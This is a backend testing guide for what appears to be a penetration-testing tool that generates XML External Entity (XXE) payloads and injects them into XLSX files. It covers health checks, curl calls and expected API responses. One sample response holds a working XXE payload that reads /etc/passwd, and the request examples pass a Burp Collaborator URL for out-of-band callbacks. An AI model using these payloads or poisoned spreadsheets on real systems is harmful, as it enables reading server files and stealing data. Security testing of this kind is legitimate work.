# Backend Testing Guide

## How to Check if Backend is Working

### Method 1: Quick Health Check
Open your browser and go to: `http://localhost:5000/api/health`

**Expected Output:**
```json
{
  "status": "healthy",
  "message": "XXE XLSX Tool Backend is running",
  "version": "1.0.0"
}
```

### Method 2: Command Line Testing
```bash
cd backend
python test_backend.py
```

**Expected Console Output:**
```
🔍 Testing XXE XLSX Tool Backend...
==================================================

1. Testing Health Check...
✅ Health Check: healthy
   Message: XXE XLSX Tool Backend is running
   Version: 1.0.0

2. Testing Payload Generation...
✅ Payload Generation: True
   Generated 12 payloads
   Example: File Read: Linux /etc/passwd (doctype)

3. Testing Invalid Input Handling...
✅ Invalid Input Properly Handled

==================================================
Backend testing completed!
```

### Method 3: Manual API Testing with curl

**Health Check:**
```bash
curl http://localhost:5000/api/health
```

**Generate Payloads:**
```bash
curl -X POST http://localhost:5000/api/generate-payloads \
  -H "Content-Type: application/json" \
  -d '{"collaborator":"https://test.burpcollaborator.net","attack_type":"all"}'
```

## Expected Backend Startup Output

When you run `python app.py`, you should see:

```
Starting XXE XLSX Tool Backend...
Health check: http://localhost:5000/api/health
API Base URL: http://localhost:5000/api/
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://[your-ip]:5000
 * Debug mode: on
```

## API Endpoints and Expected Responses

### 1. Health Check
- **URL:** `GET /api/health`
- **Response:**
```json
{
  "status": "healthy",
  "message": "XXE XLSX Tool Backend is running",
  "version": "1.0.0"
}
```

### 2. Generate Payloads
- **URL:** `POST /api/generate-payloads`
- **Request Body:**
```json
{
  "target_url": "http://internal.server/resource",
  "collaborator": "https://test.burpcollaborator.net",
  "attack_type": "all"
}
```
- **Response:**
```json
{
  "success": true,
  "payloads": [
    {
      "name": "File Read: Linux /etc/passwd",
      "type": "doctype",
      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>",
      "description": "Read Linux /etc/passwd"
    }
  ],
  "count": 12
}
```

### 3. Inject XXE (File Upload)
- **URL:** `POST /api/inject-xxe`
- **Content-Type:** `multipart/form-data`
- **Response:**
```json
{
  "success": true,
  "output_filename": "xxe_20241201_143022_sample.xlsx",
  "modified_files": ["xl/workbook.xml", "xl/sharedStrings.xml"],
  "message": "Successfully injected XXE payload into 2 files"
}
```

## Troubleshooting

### Backend Not Starting
- Check if port 5000 is available
- Ensure Python dependencies are installed: `pip install -r requirements.txt`
- Check for syntax errors in Python files

### API Not Responding
- Verify backend is running on http://localhost:5000
- Check firewall settings
- Ensure CORS is properly configured

### Error Responses
- **400 Bad Request:** Invalid input data
- **404 Not Found:** Endpoint doesn't exist
- **500 Internal Server Error:** Backend processing error

## Success Indicators

✅ **Backend is working properly if:**
1. Health check returns status "healthy"
2. Payload generation returns multiple payloads
3. No error messages in console
4. All API endpoints respond correctly
5. File upload and processing works without errors